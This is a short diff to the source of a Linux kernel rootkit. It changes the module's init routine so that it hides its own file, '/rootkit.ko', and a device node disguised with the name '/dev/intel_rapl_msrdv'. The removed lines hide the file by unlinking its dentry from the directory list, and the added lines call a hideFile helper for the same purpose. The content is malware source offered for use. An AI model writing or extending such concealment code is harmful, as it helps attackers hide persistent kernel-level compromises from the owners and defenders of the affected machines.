@@ -64,16 +64,8 @@ static int __init rootkit_init(void)
     mutex_init(&proc_mtx);
 
     // hide the rootkit file
-    __file = filp_open("/rootkit.ko", O_RDONLY, 0); // it shall be your own path
-    if (__file != NULL)
-    {
-        __dentry = __file->f_path.dentry;
-        __inode = file_inode(__file);
-        __dentry->d_child.next->prev = __dentry->d_child.prev;
-        __dentry->d_child.prev->next = __dentry->d_child.next;
-
-        filp_close(__file, NULL);
-    }
+    hideFile("/rootkit.ko"); // it shall be your own path
+    hideFile("/dev/intel_rapl_msrdv"); // it shall be your own rootkit dev name
 
     return 0;
 }
